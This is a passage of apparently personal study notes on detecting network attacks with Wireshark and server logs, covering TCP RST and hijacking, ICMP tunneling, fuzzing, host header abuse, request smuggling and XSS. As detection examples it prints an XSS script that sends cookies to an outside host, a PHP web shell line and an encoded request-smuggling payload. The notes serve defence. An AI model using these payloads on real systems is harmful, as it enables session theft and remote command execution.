+<p>This attack is a combination of a few conditions:</p>
+<ol>
+<li><code>The attacker will spoof the source address to be the affected machine's</code></li>
+<li><code>The attacker will modify the TCP packet to contain the RST flag to terminate the connection</code></li>
+<li><code>The attacker will specify the destination port to be the same as one currently in use by one of our machines.</code></li>
+</ol>
+</li>
+<li>
+<p>As such, we might notice an excessive amount of packets going to one port.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-RST.png" alt="1-RST"></p>
+</li>
+<li>
+<p>To verify a TCP RST attack, check the transmitter&rsquo;s physical address.</p>
+</li>
+<li>
+<p>If the TCP RST packets originate from a MAC address different from the one registered to the IP address (e.g., <code>192.168.10.4</code> with MAC <code>aa:aa:aa:aa:aa:aa</code>) in our network device list, it indicates an attack.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-RST.png" alt="2-RST"></p>
+</li>
+<li>
+<p>This likely indicates a TCP RST attack.</p>
+</li>
+<li>
+<p>However, attackers might spoof MAC addresses to evade detection, potentially causing retransmissions and issues similar to those seen with ARP poisoning.</p>
+</li>
+</ul>
+<h2 id="tcp-connection-hijacking">TCP Connection Hijacking</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>TCP-hijacking.pcap</code>.</p>
+</li>
+<li>
+<p>For more advanced actors, they might employ TCP connection hijacking.</p>
+</li>
+<li>
+<p>In this case the attacker will actively monitor the target connection they want to hijack.</p>
+</li>
+<li>
+<p>The attacker will then conduct sequence number prediction in order to inject their malicious packets in the correct order.</p>
+</li>
+<li>
+<p>During this injection they will spoof the source address to be the same as our affected machine.</p>
+</li>
+<li>
+<p>To maintain the hijacking, the attacker must prevent ACKs from reaching the target/affected machine, typically by delaying or blocking them.</p>
+</li>
+<li>
+<p>Consequently, this attack is often paired with ARP poisoning, which may be evident in traffic analysis.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-RST.png" alt="4-RST"></p>
+</li>
+</ul>
+<hr>
+<h1 id="icmp-tunneling">ICMP Tunneling</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>icmp_tunneling.pcapng</code>.</p>
+</li>
+<li>
+<p>Tunneling is a technique employed by adversaries in order to exfiltrate data from one location to another.</p>
+</li>
+<li>
+<p>There are many different kinds of tunneling, and each different kind uses a different protocol.</p>
+</li>
+<li>
+<p>Commonly, attackers may utilize:</p>
+<ul>
+<li>Proxies to bypass our network controls.</li>
+<li>Protocols that our systems and controls allow.</li>
+</ul>
+</li>
+</ul>
+<h2 id="basics-of-tunneling">Basics of Tunneling</h2>
+<ul>
+<li>
+<p>Tunneling allows attackers to transmit/communicate data to other hosts, often indicated by command and control over a compromised machine.</p>
+</li>
+<li>
+<p>While SSH tunneling is common, proxy-based, HTTP, HTTPS, DNS, and other methods can also be used.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/basic-tunnel-1.png" alt="basic-tunnel-1"></p>
+</li>
+<li>
+<p>The idea behind tunneling is that an attacker will be able to expand their command and control and bypass our network controls through the protocol of their choosing.</p>
+</li>
+</ul>
+<h2 id="icmp-tunneling-1">ICMP Tunneling</h2>
+<ul>
+<li>ICMP tunneling involves an attacker adding/appending data they want to steal/exfiltrate to the data field of an ICMP request.</li>
+<li>The goal is to conceal/hide this data by disguising it within normal ICMP traffic, making it harder to detect on the network.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/icmp_ping_example.jpg" alt="icmp_ping_example"></li>
+</ul>
+<h2 id="finding-icmp-tunneling">Finding ICMP Tunneling</h2>
+<ul>
+<li>
+<p>Since ICMP tunneling is primarily done through an attacker adding data into the data field for ICMP, we can find it by looking at the contents of data per request and reply.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-ICMP-tunneling.png" alt="1-ICMP-tunneling"></p>
+</li>
+<li>
+<p>We can filter our Wireshark capture to only ICMP requests and replies by entering ICMP into the filter bar.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-ICMP-tunneling.png" alt="2-ICMP-tunneling"></p>
+</li>
+<li>
+<p>Suppose we noticed fragmentation occurring within our ICMP traffic as it is above, this would indicate a large amount of data being transferred via ICMP.</p>
+</li>
+<li>
+<p>In order to understand this behavior, we should look at a normal ICMP request.</p>
+</li>
+<li>
+<p>We may note that the data is something reasonable like 48 bytes.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-ICMP-tunneling.png" alt="3-ICMP-tunneling"></p>
+</li>
+<li>
+<p>However a suspicious ICMP request might have a large data length like 38000 bytes.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-ICMP-tunneling.png" alt="4-ICMP-tunneling"></p>
+</li>
+<li>
+<p>If we would like to take a look at the data in transit, we can look on the right side of our screen in Wireshark.</p>
+</li>
+<li>
+<p>In this case, we might notice something like a Username and Password being pinged to an external or internal host.</p>
+</li>
+<li>
+<p>This is a direct indication of ICMP tunneling.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/5-ICMP-tunneling.png" alt="5-ICMP-tunneling"></p>
+</li>
+<li>
+<p>On the other hand, more advanced adversaries will utilize encoding or encryption when transmitting exfiltrated data, even in the case of ICMP tunneling.</p>
+</li>
+<li>
+<p>Suppose we noticed the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/6-ICMP-tunneling.png" alt="6-ICMP-tunneling"></p>
+</li>
+<li>
+<p>We could copy this value out of Wireshark and decode it within Linux with the base64 utility.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=&#39;</span> | base64 -d
+</span></span></code></pre></div><ul>
+<li>This would also be a case where ICMP tunneling is observed.</li>
+<li>In many cases, if the ICMP data length is larger than 48-bytes, we know something fishy is going on, and should always look into it.</li>
+</ul>
+<h2 id="preventing-icmp-tunneling">Preventing ICMP Tunneling</h2>
+<ul>
+<li>In order to prevent ICMP tunneling from occurring we can conduct the following actions.</li>
+</ul>
+<ol>
+<li><code>Block ICMP Requests</code>—Simply, if ICMP is not allowed, attackers will not be able to utilize it.</li>
+<li><code>Inspect ICMP Requests and Replies for Data</code>—Stripping data, or inspecting data for malicious content on these requests and replies can allow us better insight into our environment, and the ability to prevent this data exfiltration.</li>
+</ol>
+<hr>
+<h1 id="httphttps-service-enumeration">HTTP/HTTPs Service Enumeration</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>basic_fuzzing.pcapng</code>.</p>
+</li>
+<li>
+<p>Unusual web server traffic often indicates malicious activity, we might see that one host is generating excessive traffic with HTTP or HTTPs.</p>
+</li>
+<li>
+<p>Attackers frequently target the transport layer via HTTP or HTTPS to exploit application vulnerabilities.</p>
+</li>
+<li>
+<p>Recognizing attacker reconnaissance (or information gathering), exploitation, and abuse techniques is crucial for web server security.</p>
+</li>
+<li>
+<p>Generally speaking, we can detect and identify fuzzing attempts through the following:</p>
+<ol>
+<li><code>Excessive HTTP/HTTPs traffic from one host</code></li>
+<li><code>Referencing our web server's access logs for the same behavior</code></li>
+</ol>
+</li>
+<li>
+<p>Attackers often fuzz servers for reconnaissance (to gather information) before launching attacks.</p>
+</li>
+<li>
+<p>While a <code>Web Application Firewall</code> might prevent this, internal servers may lack such protection.</p>
+</li>
+</ul>
+<h2 id="finding-directory-fuzzing">Finding Directory Fuzzing</h2>
+<ul>
+<li>
+<p>Directory fuzzing is used by attackers to find all possible web pages and locations in our web applications.</p>
+</li>
+<li>
+<p>We can find this during our traffic analysis by limiting our Wireshark view to only http traffic.</p>
+</li>
+<li>
+<p><code>http</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-HTTP-Enum.png" alt="2-HTTP-Enum"></p>
+</li>
+<li>
+<p>Secondarily, if we wanted to remove the responses from our server, we could simply specify <code>http.request</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-HTTP-Enum.png" alt="3-HTTP-Enum"></p>
+</li>
+<li>
+<p>Directory fuzzing is quite simple to detect, as it will in most cases show the following signs</p>
+<ol>
+<li><code>A host will repeatedly attempt to access files on our web server which do not exist (response 404)</code>.</li>
+<li><code>A host will send these in rapid succession</code>.</li>
+</ol>
+</li>
+<li>
+<p>We can also always reference this traffic within our access logs on our web server.</p>
+</li>
+<li>
+<p>For Apache this would look like the following two examples.</p>
+</li>
+<li>
+<p>To use grep, we could filter like so:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat access.log | grep <span style="color:#e6db74">&#34;192.168.10.5&#34;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /randomfile1 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /frand2 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bash_history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bashrc HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cache HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.config HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvs HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvsignore HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.forward HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+...SNIP...
+</code></pre><ul>
+<li>And to use <code>awk</code>, we could do the following</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat access.log | awk <span style="color:#e6db74">&#39;$1 == &#34;192.168.10.5&#34;&#39;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /randomfile1 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /frand2 HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bash_history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.bashrc HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cache HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.config HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvs HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.cvsignore HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.forward HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.git/HEAD HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.history HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] &#34;GET /.hta HTTP/1.1&#34; 403 438 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
+...SNIP...
+</code></pre><h2 id="finding-other-fuzzing-techniques">Finding Other Fuzzing Techniques</h2>
+<ul>
+<li>
+<p>Attackers may also fuzz web servers:</p>
+<ul>
+<li>By Targeting dynamic or static elements like ID fields.</li>
+<li>Or by seeking IDOR vulnerabilities, particularly in JSON parsing (changing <code>return=max</code> to <code>return=min</code>).</li>
+</ul>
+</li>
+<li>
+<p>To limit traffic to just one host we can employ the following filter:</p>
+</li>
+</ul>
+<pre tabindex="0"><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))
+</code></pre><p><img src="http://localhost:1313/Network%20Traffic%20Analysis/4-HTTP-Enum.png" alt="4-HTTP-Enum"></p>
+<ul>
+<li>
+<p>Secondarily, we can always build an overall picture by right clicking any of these requests, going to follow, and follow HTTP stream.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4a-HTTP-Enum.png" alt="4a-HTTP-Enum"></p>
+</li>
+<li>
+<p>A rapid succession of requests suggests a fuzzing attempt, warranting further investigation of the host.</p>
+</li>
+<li>
+<p>However sometimes attackers will do the following to prevent detection:</p>
+<ol>
+<li><code>Stagger these responses across a longer period of time.</code></li>
+<li><code>Send these responses from multiple hosts or source addresses.</code></li>
+</ol>
+</li>
+</ul>
+<h2 id="preventing-fuzzing-attempts">Preventing Fuzzing Attempts</h2>
+<ul>
+<li>We can aim to prevent fuzzing attempts from adversaries by conducting the following actions.</li>
+</ul>
+<ol>
+<li><code>Maintain our virtualhost or web access configurations to return the proper response codes to throw off these scanners.</code></li>
+<li><code>Establish rules to prohibit these IP addresses from accessing our server through our web application firewall.</code></li>
+</ol>
+<hr>
+<h1 id="strange-http-headers">Strange HTTP Headers</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>CRLF_and_host_header_manipulation.pcapng</code>.</p>
+</li>
+<li>
+<p>When analyzing our web server&rsquo;s traffic, we may not immediately detect fuzzing attempts when analyzing our web server&rsquo;s traffic.</p>
+</li>
+<li>
+<p>However, this doesn&rsquo;t guarantee that malicious activity isn&rsquo;t occurring.</p>
+</li>
+<li>
+<p>To investigate further, we can examine HTTP requests for unusual patterns.</p>
+</li>
+<li>
+<p>Some of which are weird headers like:</p>
+<ol>
+<li><code>Weird Hosts (Host: )</code></li>
+<li><code>Unusual HTTP Verbs</code></li>
+<li><code>Changed User Agents</code></li>
+</ol>
+</li>
+</ul>
+<h2 id="finding-strange-host-headers">Finding Strange Host Headers</h2>
+<ul>
+<li>
+<p>In order to start, as we would normally do, we can limit our view in Wireshark to only http replies and requests.</p>
+</li>
+<li>
+<p><code>http</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-http-headers.png" alt="1-http-headers"></p>
+</li>
+<li>
+<p>To identify irregular Host headers, use the following command, specifying your web server&rsquo;s real IP address (or domain name for external servers) to exclude legitimate entries.</p>
+</li>
+<li>
+<p><code>http.request and (!(http.host == &quot;192.168.10.7&quot;))</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-http-headers.png" alt="2-http-headers"></p>
+</li>
+<li>
+<p>Suppose we noticed that this filter returned some results, we could dig into these HTTP requests a little deeper to find out what hosts these bad actors might have tried to use.</p>
+</li>
+<li>
+<p>We might commonly notice <code>127.0.0.1</code>.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-http-headers.png" alt="3-http-headers"></p>
+</li>
+<li>
+<p>Or instead something like admin.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-http-headers.png" alt="4-http-headers"></p>
+</li>
+<li>
+<p>Attackers will attempt to use different host headers to gain levels of access they would not normally achieve through the legitimate host.</p>
+</li>
+<li>
+<p>They may use proxy tools like burp suite or others to modify these before sending them to the server.</p>
+</li>
+<li>
+<p>In order to prevent successful exploitation beyond only detecting these events, we should always do the following.</p>
+</li>
+</ul>
+<ol>
+<li><code>Ensure that our virtualhosts or access configurations are setup correctly to prevent this form of access.</code></li>
+<li><code>Ensure that our web server is up to date.</code></li>
+</ol>
+<h2 id="analyzing-code-400s-and-request-smuggling">Analyzing Code 400s and Request Smuggling</h2>
+<ul>
+<li>
+<p>We might also notice some bad responses from our web server, like code 400s.</p>
+</li>
+<li>
+<p>These codes indicate a bad request from the client, so they can be a good place to start when detecting malicious actions via http/https.</p>
+</li>
+<li>
+<p>In order to filter for these, we can use the following</p>
+</li>
+<li>
+<p><code>http.response.code == 400</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/6-http-headers.png" alt="6-http-headers"></p>
+</li>
+<li>
+<p>Suppose we were to follow one of these HTTP streams, we might notice the following from the client.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/5-http-headers.png" alt="5-http-headers"></p>
+</li>
+<li>
+<p>This is commonly referred to as HTTP request smuggling or CRLF (Carriage Return Line Feed). Essentially, an attacker will try the following.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5
+</span></span></code></pre></div><ul>
+<li>Which will be decoded by our server like this.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /login.php?id=1 <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">192.168.10.5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /uploads/cmd2.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:8080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 192.168.10.5
+</span></span></code></pre></div><ul>
+<li>Essentially, in cases where our configurations are vulnerable, the first request will go through, and the second request will as well shortly after.</li>
+<li>This can give an attacker levels of access that we would normally prohibit.</li>
+<li>This occurs due to our configuration looking like the following.</li>
+</ul>
+<h2 id="apache-configuration">Apache Configuration</h2>
+<pre tabindex="0"><code>&lt;VirtualHost *:80&gt;
+
+    RewriteEngine on
+    RewriteRule &#34;^/categories/(.*)&#34; &#34;http://192.168.10.100:8080/categories.php?id=$1&#34; [P]
+    ProxyPassReverse &#34;/categories/&#34; &#34;http://192.168.10.100:8080/&#34;
+
+&lt;/VirtualHost&gt;
+</code></pre><p><a href="https://github.com/dhmosfunk/CVE-2023-25690-POC">CVE-2023-25690</a></p>
+<ul>
+<li>As such watching for these code 400s can give clear indication to adversarial actions during our traffic analysis efforts.</li>
+<li>Additionally, we would notice if an attacker is successful with this attack by finding the code <code>200</code> (<code>success</code>) in response to one of the requests which look like this.</li>
+</ul>
+<hr>
+<h1 id="cross-site-scripting-xss--code-injection-detection">Cross-Site Scripting (XSS) &amp; Code Injection Detection</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>XSS_Simple.pcapng</code>.</p>
+</li>
+<li>
+<p>Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal &ldquo;server&rdquo;, we did not recognize.</p>
+</li>
+<li>
+<p>This could be a clear indication of cross-site scripting. Let&rsquo;s take the following output for example.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-XSS.png" alt="1-XSS"></p>
+</li>
+<li>
+<p>In real-world scenarios, user cookies/tokens transmitted may not be obvious, often being encoded or encrypted</p>
+</li>
+<li>
+<p>Cross-site scripting (XSS) occurs when an attacker injects malicious JavaScript code into a webpage via user input.</p>
+</li>
+<li>
+<p>When other users visit the server, their browsers execute this injected code, allowing attackers to steal tokens, cookies, session values, and other sensitive data.</p>
+</li>
+<li>
+<p>If we were to follow one of these requests it would look like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-XSS_.png" alt="2-XSS_"></p>
+</li>
+<li>
+<p>Getting down to the root of where this code is originating can be somewhat tricky.</p>
+</li>
+<li>
+<p>However, suppose we had a user comment area on our web server.</p>
+</li>
+<li>
+<p>We might notice one of the comments looks like the following.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.0.19:5555&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cookie=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">params</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Successful cross-site scripting would necessitate immediate removal of the comment and, in most cases, server downtime to fix the issue before it persists.</p>
+</li>
+<li>
+<p>Attackers may attempt to inject code into these fields, as demonstrated in the following examples.</p>
+</li>
+<li>
+<p>In order for them to get command and control through PHP.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>Or to execute a single command with PHP:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">`whoami`</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h4 id="preventing-xss-and-code-injection">Preventing XSS and Code Injection</h4>
+<ul>
+<li>In order to prevent these threats after we detect them, we can do the following.</li>
+</ul>
+<ol>
+<li><code>Sanitize and handle user input in an acceptable manner.</code></li>
+<li><code>Do not interpret user input as code.</code></li>
+</ol>
+<hr>
+<h1 id="ssl-renegotiation-attacks">SSL Renegotiation Attacks</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>SSL_renegotiation_edited.pcapng</code>.</p>
+</li>
+<li>
+<p>Although HTTP traffic is unencrypted, we sometimes will run into encrypted HTTPs traffic.</p>
+</li>
+<li>
+<p>As such, knowing the indicators and signs of malicious HTTPs traffic is crucial to our traffic analysis efforts.</p>
+</li>
+</ul>
+<h2 id="https-breakdown">HTTPs Breakdown</h2>
+<ul>
+<li>
+<p>Unlike HTTP, which is a stateless protocol, HTTPs incorporates encryption to provide security for web servers and clients.</p>
+</li>
+<li>
+<p>It does so with the following.</p>
+<ol>
+<li><code>Transport Layer Security (Transport Layer Security)</code></li>
+<li><code>Secure Sockets Layer (SSL)</code></li>
+</ol>
+</li>
+<li>
+<p>Generally speaking, when a client establishes a HTTPs connection with a server, it conducts the following.</p>
+</li>
+</ul>
+<ol>
+<li><code>Handshake</code>—When establishing an HTTPs connection, Server &amp; Client undergo a Handshake. During an HTTPS handshake, the client and server negotiate which encryption algorithms to use and exchange their certificates.</li>
+<li><code>Encryption</code>—Upon completion of the handshake, the client and the server use the prior agreed upon encryption algorithm to encrypt further data communicated between them.</li>
+<li><code>Further Data Exchange</code>—Once the encrypted connection is established, the client and the server will continue to exchange data between each other. This data could be web pages, images, or other web resources.</li>
+<li><code>Decryption</code>—When the client transmits to the server, or the server transmits to the client, they must decrypt this data with the private and public keys.</li>
+</ol>
+<ul>
+<li>
+<p>As such, one of the more common HTTPs based attacks are <em><strong>SSL renegotiation</strong></em>, in which an attacker will negotiate the session to the lowest possible encryption standard.</p>
+</li>
+<li>
+<p>However there are other encryption attacks we should be aware of like the <code>heartbleed vulnerability</code>—<a href="https://heartbleed.com/">The Heartbleed Vulnerability CVE-2014-0160</a>.</p>
+</li>
+</ul>
+<h2 id="tls-and-ssl-handshakes">TLS and SSL Handshakes</h2>
+<ul>
+<li>
+<p>In order to establish an encrypted connection, the client and server must undergo the handshake process.</p>
+</li>
+<li>
+<p>Fortunately for us, TLS and SSL handshakes are mostly similar in their steps.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/tls-ssl-handshake.png" alt="tls-ssl-handshake"></p>
+</li>
+<li>
+<p>To break it down further, we might observe the following occur during our traffic analysis efforts.</p>
+</li>
+</ul>
+<ol>
+<li><code>Client Hello</code>—First initial step, the client sends a hello message to the server, specifying supported TLS/SSL versions, cipher suites (aka encryption algorithms), and random data (nonces) for subsequent steps.</li>
+<li><code>Server Hello</code>—Responding to the client Hello, the server will send a Server Hello message. This message includes the server&rsquo;s chosen TLS/SSL version, its selected cipher suite from the client&rsquo;s choices, and an additional nonce.</li>
+<li><code>Certificate Exchange</code>—The server then sends its digital certificate to the client, proving its identity. This certificate includes the server&rsquo;s public key, which the client will use to conduct the key exchange process.</li>
+<li><code>Key Exchange</code>—The client then generates what is referred to as the premaster secret. It then encrypts this secret using the server&rsquo;s public key from the certificate and sends it on to the server.</li>
+<li><code>Session Key Derivation</code>—The client and server use exchanged nonces and the premaster secret to compute session keys, which then enable symmetric encryption and decryption for secure communication/connection.</li>
+<li><code>Finished Messages</code>—To verify handshake completion and ensure both parties derived the same session keys, the client and server exchange finished messages. These messages contain a hash of all previous handshake messages, encrypted using the session keys.</li>
+<li><code>Secure Data Exchange</code>—Now that the handshake is complete, the client and the server can now exchange data over the encrypted channel.</li>
+</ol>
+<ul>
+<li>We can also look at this from a general algorithmic perspective.</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Handshake Step</strong></th>
+          <th><strong>Relevant Calculations</strong></th>
+      </tr>
